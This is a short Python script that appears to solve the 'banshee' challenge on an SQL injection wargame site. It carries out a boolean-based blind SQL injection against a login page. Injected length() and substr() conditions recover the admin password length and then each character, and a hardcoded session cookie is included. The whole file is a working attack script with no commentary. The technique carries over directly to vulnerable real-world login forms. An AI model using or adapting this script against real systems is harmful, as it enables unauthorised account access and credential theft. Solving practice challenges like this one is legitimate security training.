import requests
import string

url = 'https://los.rubiya.kr/chall/banshee_ece938c70ea2419a093bb0be9f01a7b1.php'
cookies = {'PHPSESSID' : '7jocdhdj9b00ob8q1cfc13oos6'}
params= {'pw' : None}

pw_len = 0
for i in range(1,30):
    params['pw'] = "' or id='admin' and length(pw) = {}-- ".format(i)
    response = requests.get(url,cookies=cookies,params=params)
    print(params)
    if response.text.count("login success!") == 1:
        print("length(pw) == {}".format(i))
        pw_len = i
        break
domain = string.digits + string.ascii_lowercase 

pw = ''
for i in range(1,pw_len + 1):
    for j in domain:
        params['pw'] = "' or id='admin' and substr(pw,{},1) = '{}' -- ".format(i,j)
        print(params)  
        response = requests.get(url,cookies=cookies,params=params)
        if response.text.count("login success!") == 1:
            pw += j
            print("find the pw : {}".format(pw))
            break